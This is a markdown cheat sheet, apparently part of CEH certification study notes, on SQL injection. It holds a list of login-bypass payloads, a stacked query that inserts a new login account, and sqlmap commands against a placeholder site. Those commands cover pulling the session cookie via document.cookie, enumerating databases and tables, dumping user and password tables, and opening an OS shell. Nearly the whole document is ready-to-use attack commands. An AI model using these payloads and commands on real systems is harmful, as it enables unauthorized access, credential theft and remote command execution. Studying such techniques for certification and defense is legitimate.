# [<<< Back to index](../CEH_index.md)
## SQL Injection


```
'
''
`
``
,
"
""
/
//
\
\\
;
' or "
-- or # 
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
' OR '' = '
'='
'LIKE'
'=0--+
 OR 1=1
' OR 'x'='x
```

blah';insert into login values('john','apple123');-- `Insert new details if sql injection found in login page in username tab enter`\

### sqlmap

`cookie` In the website profile, do inspect element and in the console tab write -  document.cookie

sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value don't remove square brackets]" --dbs `Exploit a Blind SQL Injection`

sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value don't remove square brackets]" -D databasename --tables `Command to check tables of database retrieved`

sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value don't remove square brackets]" -D databasename -T Table_Name --dump `Get user and pass -Select the table 
you want to dump`

sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value don't remove square brackets]" --os-shell `For OS shell this is the command`
